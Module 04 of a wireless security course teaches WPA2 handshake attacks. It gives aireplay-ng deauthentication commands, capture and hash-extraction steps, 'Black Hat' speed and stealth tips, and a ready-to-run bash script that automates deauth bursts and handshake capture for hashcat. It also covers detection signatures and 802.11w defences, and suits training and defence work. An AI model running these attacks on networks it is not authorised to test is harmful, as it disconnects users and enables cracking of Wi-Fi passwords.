# Module 04 — WPA2 Attacks

## 4.1 Vulnerability: WPA2 4-Way Handshake

**Classification**: Design limitation (not a CVE)  
**Affected**: All WPA2-PSK and WPA2-Enterprise implementations  
**Attack Type**: Offline brute-force via captured handshake  
**Researcher**: Published in IEEE 802.11i-2004 (inherent to protocol)

### The Vulnerability

WPA2 uses a 4-way handshake to establish session keys. Messages 1-2 or 2-3 contain sufficient information to verify password guesses offline:

```
Message Flow:
AP → Client: ANonce (random number)
Client → AP: SNonce + MIC (Message Integrity Code)
AP → Client: GTK + MIC
Client → AP: ACK
```

The MIC in Message 2 is computed as:
```
MIC = HMAC-SHA1(PTK, Message2_without_MIC)
PTK = PRF(PMK, "Pairwise key expansion", Min(AA,SA) || Max(AA,SA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))
PMK = PBKDF2-SHA1(passphrase, SSID, 4096 iterations, 256 bits)
```

**Attack Vector**: Capture SNonce + ANonce + MIC, then brute-force PMK candidates offline.

---

## 4.2 Deauthentication Attack

### Vulnerability: Unauthenticated Management Frames

**Root Cause**: 802.11 management frames lack authentication  
**CVE Reference**: Mitigated by 802.11w (Protected Management Frames)  
**Impact**: Forced disconnection, handshake capture facilitation

### Frame Structure

```
Deauthentication Frame:
- Frame Control: 0xC0 (Deauth)
- Duration: 314
- Destination: Client MAC
- Source: AP MAC (spoofed)
- BSSID: AP MAC
- Reason Code: 0x0007 (Class 3 frame received from nonassociated station)
```

### Attack Execution

```bash
# Method 1: Broadcast deauth (all clients)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 = deauth attack
# 0 = continuous (use 5-10 for limited burst)
# -a = AP BSSID

# Method 2: Targeted deauth (specific client)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -c = target client MAC

# Method 3: Directed to client (from AP perspective)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Client receives deauth from spoofed AP MAC
```

---

## 4.3 Handshake Capture

### Prerequisites

1. Monitor mode interface on target channel
2. Target AP with active clients
3. Deauth capability (for active capture)

### Capture Workflow

```bash
# Step 1: Start monitor mode on target channel
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Lock to target channel and capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Step 3: In another terminal, force handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 4: Verify capture
aircrack-ng handshake-01.cap

# Expected output:
# Reading packets, please wait...
# Opening handshake-01.cap
# Read 1452 packets.

#   #  BSSID              ESSID                     Encryption
#   1  AA:BB:CC:DD:EE:FF  TargetNet                 WPA (1 handshake)
#                                                          ^^^^^^^^^^^^^^^^ OK
```

### Capture Verification

```bash
# Check for valid handshake with tshark
tshark -r handshake-01.cap -Y "eapol" 2>/dev/null | wc -l
# Output: 4 (2 frames × 2 directions) = complete handshake

# Extract handshake details
tshark -r handshake-01.cap -Y "eapol" -T fields -e frame.number -e frame.time -e wlan.sa -e eapol.keydes.key_info 2>/dev/null

# Verify with aircrack-ng
aircrack-ng handshake-01.cap 2>&1 | grep -E "(handshake|WPA)"
```

---

## 4.4 Hash Extraction

### aircrack-ng Method

```bash
# Extract hash for hashcat (legacy format)
aircrack-ng handshake-01.cap -J hashcat-output
# Produces: hashcat-output.hccapx

# Extract for John the Ripper
aircrack-ng handshake-01.cap -j john-output
# Produces: john-output
```

### hcxpcapngtool Method (Modern)

```bash
# Install hcxtools
sudo apt install hcxtools

# Convert to hashcat mode 22000 (recommended)
hcxpcapngtool -o hash.hc22000 -E essidlist.txt handshake-01.cap

# Output format (hashcat mode 22000):
# WPA*02*PMKID*MAC_AP*MAC_STA*ESSID*anoncesnonce*MIC*EAPOL

# Verify conversion
head -1 hash.hc22000
```

### Format Comparison

| Tool | Output Format | Hashcat Mode | Notes |
|------|---------------|--------------|-------|
| aircrack-ng | .hccapx | 2500/16800 | Legacy |
| hcxpcapngtool | .hc22000 | 22000 | Modern, recommended |
| cap2hccapx | .hccapx | 2500 | Standalone converter |

---

## 4.5 Detection: How Defenders See Attacks

### Deauth Detection Signatures

| Signature | Detection Method | Tool |
|-----------|------------------|------|
| Burst of deauth frames | Frame type analysis | Wireshark, Kismet |
| Rapid client reconnection | Association rate spike | WIPS |
| Spoofed source MAC | MAC consistency check | 802.11w enabled APs |
| Sequence number gaps | Frame sequence analysis | Custom scripts |

### WIDS Alert Examples

```
Aruba WIDS: "Deauthentication Flood Detected"
- Threshold: >10 deauth frames/second
- Action: Block source MAC, alert admin

Cisco WIPS: "Rogue Disassociation Attack"
- Threshold: >5 disassoc frames/minute
- Action: Contain rogue, log event
```

### Evidence Analysis

```bash
# Detect deauth attacks in capture
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x0c" -T fields -e frame.time -e wlan.sa -e wlan.da -e wlan.fc.type_subtype

# Find deauth reasons
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x0c" -T fields -e wlan.sa -e wlan.da -e wlan_mgt.fixed.reason_code

# Common reason codes:
# 2 = Previous authentication no longer valid
# 3 = Deauthenticated because sending STA is leaving
# 6 = Class 2 frame received from nonauthenticated STA
# 7 = Class 3 frame received from nonassociated STA
```

---

## 4.6 Defense: Preventing Handshake Attacks

### 802.11w (Protected Management Frames)

**Standard**: IEEE 802.11w-2009  
**Function**: Cryptographically protects deauth/disassoc frames  
**Impact**: Prevents forged deauth attacks

```
Without 802.11w:
Attacker → Spoofed Deauth → Client disconnects immediately

With 802.11w enabled:
Attacker → Spoofed Deauth → Client validates MIC → Ignores frame
```

### Implementation Check

```bash
# Check if AP supports 802.11w
sudo airodump-ng -c 6 --bssid TARGET_BSSID wlan0mon
# Look for "MFP" (Management Frame Protection) in output
# MFP=No: Vulnerable to deauth
# MFP=Yes: Protected
```

### Defensive Recommendations

| Control | Implementation | Effectiveness |
|---------|---------------|---------------|
| Enable 802.11w | Set to "Required" in AP config | Blocks deauth attacks |
| Strong passphrases | 20+ characters, random | Increases brute-force time |
| RADIUS accounting | Monitor association rates | Detects handshake harvesting |
| Client isolation | Prevent lateral movement | Limits attack impact |
| WIDS deployment | Real-time anomaly detection | Early warning |

---

## 4.7 Black Hat: Optimizing Attack Speed

### Channel Lock Optimization

```bash
# Pre-lock channel to avoid hop delay
sudo iwconfig wlan0mon channel 6

# Verify lock
iwconfig wlan0mon | grep Channel
```

### Multi-Client Targeting

```bash
# Deauth all clients simultaneously for maximum handshake probability
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0mon &
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0mon &
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0mon &
wait
```

### Passive Capture (Stealth)

```bash
# No deauth - wait for natural reconnection
sudo timeout 3600 airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w passive-capture wlan0mon
# Leaves no attack signature
```

---

## 4.8 PoC Script: Automated Handshake Capture

```bash
#!/bin/bash
# handshake-capture.sh - Automated WPA2 handshake capture
# Usage: sudo ./handshake-capture.sh <bssid> <channel> <interface>

BSSID=$1
CHANNEL=$2
INTERFACE=${3:-wlan0mon}
OUTPUT="handshake-${BSSID//:/-}"

if [ $# -lt 2 ]; then
    echo "Usage: sudo $0 <BSSID> <CHANNEL> [INTERFACE]"
    echo "Example: sudo $0 AA:BB:CC:DD:EE:FF 6 wlan0mon"
    exit 1
fi

echo "[+] Target BSSID: $BSSID"
echo "[+] Channel: $CHANNEL"
echo "[+] Interface: $INTERFACE"

# Verify monitor mode
if ! iwconfig "$INTERFACE" | grep -q "Mode:Monitor"; then
    echo "[!] Interface not in monitor mode. Run: sudo airmon-ng start ${INTERFACE%mon}"
    exit 1
fi

# Set channel
sudo iwconfig "$INTERFACE" channel "$CHANNEL"
echo "[+] Locked to channel $CHANNEL"

# Start capture in background
echo "[+] Starting capture..."
sudo timeout 300 airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT" "$INTERFACE" &
AIRODUMP_PID=$!

# Wait for airodump to start
sleep 5

# Attempt deauth bursts every 30 seconds
for i in {1..10}; do
    echo "[+] Deauth burst $i/10..."
    sudo aireplay-ng -0 5 -a "$BSSID" "$INTERFACE" 2>/dev/null
    sleep 25
    
    # Check for handshake
    if aircrack-ng "${OUTPUT}-01.cap" 2>&1 | grep -q "1 handshake"; then
        echo "[+] Handshake captured successfully!"
        kill $AIRODUMP_PID 2>/dev/null
        break
    fi
done

# Final verification
echo ""
echo "[+] Verifying capture..."
if aircrack-ng "${OUTPUT}-01.cap" 2>&1 | grep -q "handshake"; then
    echo "[+] SUCCESS: Handshake captured: ${OUTPUT}-01.cap"
    
    # Convert to modern format
    if command -v hcxpcapngtool &> /dev/null; then
        hcxpcapngtool -o "${OUTPUT}.hc22000" "${OUTPUT}-01.cap" 2>/dev/null
        echo "[+] Converted to: ${OUTPUT}.hc22000 (hashcat mode 22000)"
    fi
else
    echo "[!] No handshake captured. Possible reasons:"
    echo "    - No clients connected to target"
    echo "    - 802.11w (MFP) enabled on AP"
    echo "    - Channel interference"
    echo "    - Target too far (weak signal)"
fi

kill $AIRODUMP_PID 2>/dev/null
echo "[+] Done"
```

---

## 4.9 Troubleshooting

### Issue: "No such BSSID available"

**Cause**: Target not on specified channel  
**Fix**: Verify channel with `airodump-ng`, adjust `-c` parameter

### Issue: "Injection not working"

**Cause**: Adapter lacks packet injection support  
**Fix**: Test with `sudo aireplay-ng --test wlan0mon`

### Issue: "No handshake captured"

**Possible Causes**:
1. **No clients connected** → Wait or find different target
2. **802.11w enabled** → Passive capture only
3. **Wrong channel** → Verify with `airodump-ng`
4. **Weak signal** → Move closer or use directional antenna

### Issue: "Got a deauth packet"

**Cause**: AP detected attack and sent deauth to attacker  
**Fix**: Slow down attack rate, use passive capture

---

## 4.10 Knowledge Check

Before proceeding, verify you can:

1. Explain the WPA2 4-way handshake message flow
2. Execute a deauthentication attack with aireplay-ng
3. Capture and verify a WPA2 handshake
4. Convert captures to hashcat-compatible format
5. Explain how 802.11w prevents deauth attacks
6. Identify detection signatures left by attacks

---

**Next**: [Module 05 — WPS Attacks](05-wps-attacks.md)
